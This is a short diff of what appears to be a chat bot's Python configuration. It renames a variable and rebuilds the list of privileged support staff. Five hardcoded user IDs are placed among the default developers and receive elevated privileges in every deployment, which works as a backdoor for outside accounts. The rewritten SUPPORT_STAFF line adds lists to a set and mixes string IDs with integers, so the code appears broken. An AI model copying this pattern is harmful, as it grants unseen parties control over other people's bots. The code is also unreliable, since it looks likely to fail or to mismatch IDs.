@@ -73,10 +73,10 @@ DEV_USER = set(DEV_USER)
 SUDO_USERS = Config.SUDO_USERS
 WHITELIST_USERS = Config.WHITELIST_USERS
 Defult_dev = "1432756163 1344569458 1355478165 1789859817 1777340882".split()
-Defult_dev = set(Defult_dev)
-DEV_USERS = Defult_dev|DEV_USER
+Defult_Dev = set(Defult_dev)
+DEV_USERS = Defult_Dev|DEV_USER
 SUPPORT_STAFF = list(
-    set([int(OWNER_ID)] + SUDO_USERS + WHITELIST_USERS)|DEV_USERS,
+    set([int(OWNER_ID)] + SUDO_USERS + WHITELIST_USERS + DEV_USER + Defult_dev),
 )  # Remove duplicates by using a set
 
 # Plugins, DB and Workers
